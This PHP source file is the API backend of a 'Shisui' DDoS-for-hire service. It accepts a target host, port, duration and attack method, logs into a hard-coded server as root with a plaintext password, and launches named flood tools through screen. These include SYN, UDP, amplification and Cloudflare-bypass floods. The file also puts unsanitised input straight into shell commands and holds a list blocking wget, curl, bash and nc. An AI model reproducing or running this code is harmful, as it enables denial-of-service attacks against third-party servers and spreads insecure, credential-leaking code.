<?php

require('/var/www/html/Bin/xwaf.php');
$xWAF = new xWAF();
$xWAF->start(); 

// 𝐀𝐏𝐈 𝐂𝐨𝐥𝐨𝐫 𝐂𝐨𝐧𝐟𝐢𝐠

require 'ShisuiUsers.php';
require 'ShisuiBlacklist.php';
require 'ShisuiFunctions.php';

$backgroundcolor="202020";
$textcolor="4b0082";
 
/*
 
𝐓𝐡𝐞 𝐒𝐡𝐢𝐬𝐮𝐢 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐀𝐏𝐈 𝐈𝐈
𝐰𝐚𝐬 𝐦𝐚𝐝𝐞 𝐚𝐧𝐝 𝐫𝐞𝐯𝐚𝐦𝐩𝐞𝐝 𝐛𝐲
      𝐂𝐨𝐧𝐬𝐞𝐫𝐯𝐚𝐭𝐢𝐯𝐞
  𝐁𝐥𝐚𝐜𝐤𝐨𝐮𝐭 𝐚𝐧𝐝 𝐇𝐲𝐧𝐢𝐱!
 
*/

if ($backgroundcolor != NULL or $backgroundcolor != ""){
   $body="<body style='background:#$backgroundcolor;'></body>";
   $stat="#$backgroundcolor runs";
}
echo $body;
 
// 𝐒𝐞𝐫𝐯𝐞𝐫 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐚𝐭𝐢𝐨𝐧
 
$server_ip = "193.168.146.5";
$server_username = "root";
$server_password = "youlovegay1211";

// 𝐆𝐄𝐓 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬
 
$username = $_GET['username'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
 
// 𝐌𝐞𝐭𝐡𝐨𝐝 𝐚𝐫𝐫𝐚𝐲 𝐥𝐢𝐬𝐭. (𝐕𝐚𝐥𝐢𝐝 𝐌𝐞𝐭𝐡𝐨𝐝𝐬)
 
$methods = array(
   "STOP",
   "2K-KILL",
   "ACK",
   "BO4-BYPASS",
   "BYPASS",
   "DOMINATE",
   "GAME-BETA",
   "GAME-SERVER",
   "GRENADE",
   "KILLALL",
   "SSYN-V2",
   "STCP",
   "STORMUDP",
   "SYN",
   "SYNACK",
   "TCP-BP",
   "TCP-KILL",
   "UDP",
   "UDP-RAW",
   "UDPRAPE",
   "UDPSLAP",
   "XMAS",
   "ZAP",
   "GET-BYPASS",
   "POST-BYPASS",
   "VSE",
   "NTP",
   "DNS",
   "ARD",
   "NFO-KILLER",
   "DVR",
   "ARD",
   "OVH-DOWN",
   "CPURAPE",
   "OVH-AMP",
   "LDAP",
   "RAW",
   "OVH-SHISUI",
   "DISCORD",
   "FORTNITE",
   "R6-SHISUI",
   "FIVEM-SHISUI",
   "PUBG-SHISUI",
   "AMONGUS",
   "ROBLOX",
   "COD",
   "OVH-RAPE",
   "DEDI-SHISUI",
   "GREENSYN",
   "BLUESYN",
   "NFO-SHISUI",
   "HTTP-COOKIE",
   "HTTP-UAM",
   "HTTP-KILL",
   "HTTP-LOW",
);
 
// 𝐓𝐡𝐫𝐨𝐰𝐬 𝐞𝐫𝐫𝐨𝐫 𝐨𝐧 𝐠𝐢𝐯𝐞𝐧 𝐝𝐨𝐦𝐚𝐢𝐧 𝐞𝐱𝐭𝐞𝐧𝐬𝐢𝐨𝐧!

function endFunc($str, $lastString) {
  $count = strlen($lastString);
  if ($count == 0) {
     return true;
  }
  return (substr($str, -$count) === $lastString);
}

if(endFunc($host,".gov")) // .GOV
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,".ca")) // .CA
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,".edu")) // .EDU
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,"wget")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,"curl")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,"WGET")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");      
if(endFunc($host,"bash")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");  
if(endFunc($host,"nc")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,"sh")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");   
if(endFunc($host,"nc")) // 
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");           
// 𝐄𝐧𝐝 𝐨𝐟 𝐭𝐡𝐞 𝐝𝐨𝐦𝐚𝐢𝐧 𝐜𝐨𝐧𝐟𝐢𝐠.

if (in_array($username, $people)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Invalid username!</span>");}
 
if (in_array($host, $blacklisted))
 {
   die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
 }
 
if ($port > 44405){
 die("<span style=color:#$textcolor;text-align:center;>Invalid port!</span>");}
 
if (!empty($time)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Invalid time!</span>");}
 
if (!empty($method)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Method is empty!</span>");}
if (in_array($method, $methods)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Unknown method!</span>");}
       
if ($time > 300){
 die("<span style=color:#$textcolor;text-align:center;>Maximum time exceeded!</span>");}
if(ctype_digit($Time)){
 die("<span style=color:#$textcolor;text-align:center;>Time must be in numbers!</span>");}
 
if(ctype_digit($Port)){
 die("<span style=color:#$textcolor;text-align:center;>Port must be in numbers!</span>");}

// 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐡𝐞 𝐰𝐞𝐛𝐡𝐨𝐨𝐤!

 if (isset($username, $host, $port, $time, $method)) {

  SendWebhook();

}
// 𝐈𝐧𝐩𝐮𝐭 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬
 
if ($method == "2K-KILL") { $command = "screen -dm ./2K-KILL $host $port 10 -1 $time"; }
if ($method == "ACK") { $command = "screen -dm ./ACK $host $port 10 -1 $time"; }
if ($method == "BO4-BYPASS") { $command = "screen -dm ./BO4-BYPASS $host $port 10 $time"; }
if ($method == "BYPASS") { $command = "screen -dm ./BYPASS $host 10 -1 $time"; }
if ($method == "DOMINATE") { $command = "screen -dm ./DOMINATE $host $port 10 -1 $time"; }
if ($method == "GAME-BETA") { $command = "screen -dm ./GAME-BETA $host $port 10 $time"; }
if ($method == "GAME-SERVER") { $command = "screen -dm ./GAME-SERVER $host 10 -1 $time"; }
if ($method == "GRENADE") { $command = "screen -dm ./GRENADE $host $port 10 -1 $time"; }
if ($method == "KILLALL") { $command = "screen -dm ./KILLALL $host $port 10 -1 $time ack"; }
if ($method == "SSYN-V2") { $command = "screen -dm ./SSYN-V2 $host $port 10 $time"; }
if ($method == "STCP") { $command = "screen -dm ./STCP $host $port 10 -1 $time ack"; }
if ($method == "STORMUDP") { $command = "screen -dm ./STORMUDP -d $host -p $port -t $time"; }
if ($method == "SYN") { $command = "screen -dm ./SYN $host $port $time"; }
if ($method == "SYNACK") { $command = "screen -dm ./SYNACK $host 10 -1 $time"; }
if ($method == "TCP-BP") { $command = "screen -dm ./TCP-BP $host $port 10 -1 $time"; }
if ($method == "TCP-KILL") { $command = "screen -dm ./TCP-KILL $host 10 -1 $time"; }
if ($method == "UDP") { $command = "screen -dm ./UDP $host $port 10 1024 10 $time"; }
if ($method == "UDP-RAW") { $command = "screen -dm ./UDP-RAW $host $port 10 10 $time"; }
if ($method == "UDPRAPE") { $command = "screen -dm ./UDPRAPE $host $port 1024 10 -1 $time"; }
if ($method == "UDPSLAP") { $command = "screen -dm ./UDPSLAP $host $port 10 1024 10 $time"; }
if ($method == "XMAS") { $command = "screen -dm ./XMAS $host 10 -1 $time"; }
if ($method == "ZAP") { $command = "screen -dm ./ZAP $host $port 10 -1 $time"; }
if ($method == "GET-BYPASS") { $command = "screen -dm ./HTTP-RAW $host 9000 get $time nil"; }
if ($method == "POST-BYPASS") { $command = "screen -dm ./HTTP-RAW $host 9000 post $time nil"; }
if ($method == "VSE") { $command = "screen -dm ./VSE $host 10 -1 $time"; }
if ($method == "NTP") { $command = "screen -dm ./NTP $host $port ntp.txt 10 $time"; }
if ($method == "DNS") { $command = "screen -dm ./DNS $host $port fatdns.txt 10 $time"; }
if ($method == "DVR") { $command = "screen -dm ./DVR $host $port dvr.txt 10 -1 $time"; }
if ($method == "NFO-KILLER") { $command = "screen -dm ./NFO-KILLER $host $port 10 -1 $time"; }
if ($method == "OVH-DOWN") { $command = "screen -dm ./OVH-DOWN $host $port 10 $time"; }
if ($method == "CPURAPE") { $command = "screen -dm ./CPURAPE -d $host -p $port -t $time"; }
if ($method == "ARD") { $command = "screen -dm ./ARD $host $port ard.txt 10 -1 $time"; }
if ($method == "OVH-AMP") { $command = "screen -dm ./OVH-CHAOS $host 10 -1 $time"; }
if ($method == "LDAP") { $command = "screen -dm ./LDAP $host $port ldap.txt 10 -1 $time"; }
if ($method == "RAW") { $command = "screen -dm ./RAW $host $port 10 10 -1 $time"; }
if ($method == "OVH-SHISUI") { $command = "screen -dm ./OVH-BONK $host 70 -1 $time"; }
if ($method == "DISCORD") { $command = "screen -dm ./DISCORD $host $port game.txt 10 -1 $time"; }
if ($method == "FORTNITE") { $command = "screen -dm ./FORTNITE $host $port game.txt 10 -1 $time"; }
if ($method == "R6-SHISUI") { $command = "screen -dm ./R6-LUNAR $host $port game.txt 10 -1 $time"; }
if ($method == "FIVEM-SHISUI") { $command = "screen -dm ./FIVEM-LUNAR $host $port game.txt 10 -1 $time"; }
if ($method == "PUBG-SHISUI") { $command = "screen -dm ./PUBG-LUNAR $host $port game.txt 10 -1 $time"; }
if ($method == "AMONGUS") { $command = "screen -dm ./AMONGUS $host $port game.txt 10 -1 $time"; }
if ($method == "ROBLOX") { $command = "screen -dm ./ROBLOX $host $port game.txt 10 -1 $time"; }
if ($method == "COD") { $command = "screen -dm ./COD $host $port game.txt 10 -1 $time"; }
if ($method == "OVH-RAPE") { $command = "screen -dm ./OVH-RAPE $host $port fatdns.txt 50 -1 $time"; }
if ($method == "DEDI-SHISUI") { $command = "screen -dm ./DEDI-BONK $host $port dedi-bonk.txt 25 -1 $time"; }
if ($method == "BLUESYN") { $command = "screen -dm ./BLUESYN $host $port 10 -1 $time"; }
if ($method == "GREENSYN") { $command = "screen -dm ./GREENSYN $host $port 10 $time"; }
if ($method == "NFO-SHISUI") { $command = "screen -dm ./NFO-SHISUI $host:$port "; }
if ($method == "HTTP-COOKIE") { $command = "node CFBypassMulti.js $host $time"; }
if ($method == "HTTP-UAM") { $command = "node cfUAM.js $host $time"; }
if ($method == "HTTP-KILL") { $command = "node CFSockets.js $host $time"; }
if ($method == "HTTP-LOW") { $command = "node CFBypass.js $host $time"; }
if ($method == "HTTP-GET") { $command = "node CFBypassMulti.js $host $time"; }
if ($method == "HTTP-POST") { $command = "node CFSockets.js $host $time"; }
 
// 𝐒𝐭𝐨𝐩 𝐜𝐨𝐦𝐦𝐚𝐧𝐝
 
if ($method == "stop") { $command = "pkill $host -f"; }

// 𝐃𝐨𝐧'𝐭 𝐦𝐞𝐬𝐬 𝐰𝐢𝐭𝐡 𝐭𝐡𝐞𝐬𝐞 𝐬𝐞𝐭𝐭𝐢𝐧𝐠𝐬 𝐩𝐥𝐞𝐚𝐬𝐞
 
if (!function_exists("ssh2_connect")) die("<span style=color:#$textcolor;text-align:center;>Install SSH2!</span>");
if(!($con = ssh2_connect($server_ip, 22))){
 echo "<span style=color:#$textcolor;text-align:center;>Failure to open on port 22!</span>";
} else {
 // 𝐋𝐨𝐠𝐠𝐢𝐧𝐠 𝐢𝐧...
 
   if(!ssh2_auth_password($con, $server_username, $server_password)) {
       echo "<span style=color:#$textcolor;text-align:center;>Server config is wrong!</span>";
   } else {
     
     // 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐢𝐧𝐠 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤...
        if (!($stream = ssh2_exec($con, $command ))) {
           echo "<span style=color:#$textcolor;text-align:center;>Attack failure!</span>";
       } else { 
 
         // 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐞𝐧𝐭!
        
           stream_set_blocking($stream, false);
           $data = "";
           while ($buf = fread($stream,4096)) {
               $data .= $buf;
           }
                       echo "<span style=color:#$textcolor;text-align:center;>Attack sent to $host on port $port for $time seconds using $method</span>";
           fclose($stream);
       }
   }
}
?>
 

